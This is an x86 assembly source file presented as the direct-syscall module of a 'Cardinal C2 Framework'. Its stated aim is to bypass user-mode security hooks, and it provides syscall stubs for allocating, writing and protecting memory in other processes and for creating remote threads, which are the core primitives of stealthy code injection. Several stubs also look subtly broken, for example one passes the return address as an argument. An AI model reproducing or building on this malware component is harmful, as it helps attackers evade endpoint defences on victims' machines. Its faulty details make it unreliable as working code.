; Cardinal C2 Framework - Direct Syscall Module (x86 Assembly)
; Bypass usermode hooks by making direct syscalls to kernel
; Assemble with NASM: nasm -f win32 syscalls.asm -o syscalls.obj

BITS 32

section .text
global _NtAllocateVirtualMemory_syscall
global _NtWriteVirtualMemory_syscall
global _NtProtectVirtualMemory_syscall
global _NtCreateThreadEx_syscall
global _NtQuerySystemInformation_syscall
global _NtOpenProcess_syscall
global _NtClose_syscall
global _NtDelayExecution_syscall
global _NtReadVirtualMemory_syscall
global _NtQueryInformationProcess_syscall

; ==============================================================================
; Direct Syscall Stub Generator Macro
; ==============================================================================
%macro SYSCALL_STUB 2
global _%1_syscall
_%1_syscall:
    mov eax, %2                 ; Syscall number
    mov edx, esp                ; Pointer to arguments
    int 0x2E                    ; Call kernel (int 2Eh for compatibility)
    ret
%endmacro

; ==============================================================================
; Windows 7 SP1 x86 Syscall Numbers
; ==============================================================================

; NtAllocateVirtualMemory syscall
_NtAllocateVirtualMemory_syscall:
    push ebp
    mov ebp, esp
    
    mov eax, 0x0015             ; Syscall number for NtAllocateVirtualMemory (Win7 x86)
    mov edx, esp
    add edx, 8                  ; Skip return address and saved EBP
    
    ; Setup syscall parameters on stack
    push dword [ebp + 28]       ; Protect
    push dword [ebp + 24]       ; AllocationType
    push dword [ebp + 20]       ; RegionSize
    push dword [ebp + 16]       ; ZeroBits
    push dword [ebp + 12]       ; BaseAddress
    push dword [ebp + 8]        ; ProcessHandle
    
    int 0x2E                    ; System call
    
    mov esp, ebp
    pop ebp
    ret 24

; NtWriteVirtualMemory syscall
_NtWriteVirtualMemory_syscall:
    push ebp
    mov ebp, esp
    
    mov eax, 0x0037             ; Syscall number for NtWriteVirtualMemory
    mov edx, esp
    add edx, 8
    
    push dword [ebp + 28]       ; NumberOfBytesWritten
    push dword [ebp + 24]       ; BufferSize
    push dword [ebp + 20]       ; Buffer
    push dword [ebp + 16]       ; BaseAddress
    push dword [ebp + 12]       ; ProcessHandle
    
    int 0x2E
    
    mov esp, ebp
    pop ebp
    ret 20

; NtProtectVirtualMemory syscall
_NtProtectVirtualMemory_syscall:
    push ebp
    mov ebp, esp
    
    mov eax, 0x004D             ; Syscall number for NtProtectVirtualMemory
    mov edx, esp
    add edx, 8
    
    push dword [ebp + 24]       ; OldProtect
    push dword [ebp + 20]       ; NewProtect
    push dword [ebp + 16]       ; NumberOfBytesToProtect
    push dword [ebp + 12]       ; BaseAddress
    push dword [ebp + 8]        ; ProcessHandle
    
    int 0x2E
    
    mov esp, ebp
    pop ebp
    ret 20

; NtCreateThreadEx syscall
_NtCreateThreadEx_syscall:
    push ebp
    mov ebp, esp
    
    mov eax, 0x00A5             ; Syscall number for NtCreateThreadEx (Win7+)
    mov edx, esp
    add edx, 8
    
    push dword [ebp + 48]       ; AttributeList
    push dword [ebp + 44]       ; CreateSuspended
    push dword [ebp + 40]       ; ZeroBits
    push dword [ebp + 36]       ; StackCommit
    push dword [ebp + 32]       ; StackReserve
    push dword [ebp + 28]       ; Parameter
    push dword [ebp + 24]       ; StartRoutine
    push dword [ebp + 20]       ; ClientId
    push dword [ebp + 16]       ; ObjectAttributes
    push dword [ebp + 12]       ; ProcessHandle
    push dword [ebp + 8]        ; DesiredAccess
    push dword [ebp + 4]        ; ThreadHandle
    
    int 0x2E
    
    mov esp, ebp
    pop ebp
    ret 44

; NtQuerySystemInformation syscall
_NtQuerySystemInformation_syscall:
    push ebp
    mov ebp, esp
    
    mov eax, 0x0033             ; Syscall number for NtQuerySystemInformation
    mov edx, esp
    add edx, 8
    
    push dword [ebp + 24]       ; ReturnLength
    push dword [ebp + 20]       ; SystemInformationLength
    push dword [ebp + 16]       ; SystemInformation
    push dword [ebp + 12]       ; SystemInformationClass
    
    int 0x2E
    
    mov esp, ebp
    pop ebp
    ret 16

; NtOpenProcess syscall
_NtOpenProcess_syscall:
    push ebp
    mov ebp, esp
    
    mov eax, 0x0023             ; Syscall number for NtOpenProcess
    mov edx, esp
    add edx, 8
    
    push dword [ebp + 20]       ; ClientId
    push dword [ebp + 16]       ; ObjectAttributes
    push dword [ebp + 12]       ; DesiredAccess
    push dword [ebp + 8]        ; ProcessHandle
    
    int 0x2E
    
    mov esp, ebp
    pop ebp
    ret 16

; NtClose syscall
_NtClose_syscall:
    push ebp
    mov ebp, esp
    
    mov eax, 0x000C             ; Syscall number for NtClose
    mov edx, esp
    add edx, 8
    
    push dword [ebp + 8]        ; Handle
    
    int 0x2E
    
    mov esp, ebp
    pop ebp
    ret 4

; NtDelayExecution syscall (Sleep equivalent)
_NtDelayExecution_syscall:
    push ebp
    mov ebp, esp
    
    mov eax, 0x0031             ; Syscall number for NtDelayExecution
    mov edx, esp
    add edx, 8
    
    push dword [ebp + 12]       ; DelayInterval
    push dword [ebp + 8]        ; Alertable
    
    int 0x2E
    
    mov esp, ebp
    pop ebp
    ret 8

; NtReadVirtualMemory syscall
_NtReadVirtualMemory_syscall:
    push ebp
    mov ebp, esp
    
    mov eax, 0x003C             ; Syscall number for NtReadVirtualMemory
    mov edx, esp
    add edx, 8
    
    push dword [ebp + 28]       ; NumberOfBytesRead
    push dword [ebp + 24]       ; BufferSize
    push dword [ebp + 20]       ; Buffer
    push dword [ebp + 16]       ; BaseAddress
    push dword [ebp + 12]       ; ProcessHandle
    
    int 0x2E
    
    mov esp, ebp
    pop ebp
    ret 20

; NtQueryInformationProcess syscall
_NtQueryInformationProcess_syscall:
    push ebp
    mov ebp, esp
    
    mov eax, 0x0016             ; Syscall number for NtQueryInformationProcess
    mov edx, esp
    add edx, 8
    
    push dword [ebp + 28]       ; ReturnLength
    push dword [ebp + 24]       ; ProcessInformationLength
    push dword [ebp + 20]       ; ProcessInformation
    push dword [ebp + 16]       ; ProcessInformationClass
    push dword [ebp + 12]       ; ProcessHandle
    
    int 0x2E
    
    mov esp, ebp
    pop ebp
    ret 20

; ==============================================================================
; Advanced syscall stub for Windows 10 (sysenter/syscall instruction)
; ==============================================================================
section .text
global _syscall_dispatcher

_syscall_dispatcher:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    push edi
    
    ; Get syscall number from parameter
    mov eax, [ebp + 8]
    
    ; Prepare stack for syscall
    mov edx, esp
    
    ; Check Windows version and use appropriate syscall method
    ; For Windows 10: use syscall instruction
    ; For Windows 7/8: use int 2Eh
    ; For older: use int 2Eh
    
    ; Detect SYSENTER support
    mov ecx, 1
    cpuid
    test edx, 0x800            ; Check for SYSENTER support (bit 11)
    jz .use_int2e
    
    ; Use SYSENTER (faster)
    mov ecx, esp
    sysenter
    jmp .done
    
.use_int2e:
    ; Use INT 2E (compatible)
    int 0x2E
    
.done:
    pop edi
    pop esi
    pop ebx
    pop ebp
    ret

; ==============================================================================
; Helper: Get syscall number dynamically (for different Windows versions)
; ==============================================================================
global _get_syscall_number

_get_syscall_number:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    
    ; Get function address from parameter
    mov esi, [ebp + 8]
    
    ; Check if function starts with MOV EAX, imm32 (B8 XX XX XX XX)
    cmp byte [esi], 0xB8
    jne .error
    
    ; Extract syscall number
    mov eax, [esi + 1]
    jmp .done
    
.error:
    xor eax, eax
    
.done:
    pop esi
    pop ebx
    pop ebp
    ret

; ==============================================================================
; Direct kernel call without going through NTDLL
; ==============================================================================
global _direct_kernel_call

_direct_kernel_call:
    push ebp
    mov ebp, esp
    
    ; This is a template for direct kernel execution
    ; In practice, you would need to:
    ; 1. Map ntoskrnl.exe into user space (read-only)
    ; 2. Parse its export table
    ; 3. Calculate function addresses
    ; 4. Execute via syscall with proper parameters
    
    ; For now, this is a placeholder
    mov eax, 0xC0000001        ; STATUS_UNSUCCESSFUL
    
    pop ebp
    ret

; ==============================================================================
; Syscall number table for different Windows versions
; ==============================================================================
section .data
    ; Windows 7 SP1 x86
    syscall_table_win7 dd 0x0015, 0x0037, 0x004D, 0x00A5, 0x0033, 0x0023, 0x000C, 0x0031
    
    ; Windows 8.1 x86
    syscall_table_win8 dd 0x0018, 0x003A, 0x0050, 0x00B3, 0x0036, 0x0026, 0x000F, 0x0034
    
    ; Windows 10 x86 (1903)
    syscall_table_win10 dd 0x0018, 0x003A, 0x0050, 0x00BD, 0x0036, 0x0026, 0x000F, 0x0034

section .bss
    current_syscall_table resd 8
